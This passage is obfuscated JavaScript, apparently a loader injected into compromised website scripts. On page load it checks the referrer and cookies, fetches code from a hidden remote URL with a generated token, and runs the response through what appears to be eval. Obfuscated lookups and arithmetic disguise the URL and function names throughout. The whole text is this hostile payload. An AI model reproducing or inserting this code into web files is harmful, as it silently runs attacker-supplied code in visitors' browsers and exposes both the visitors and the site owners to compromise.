Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};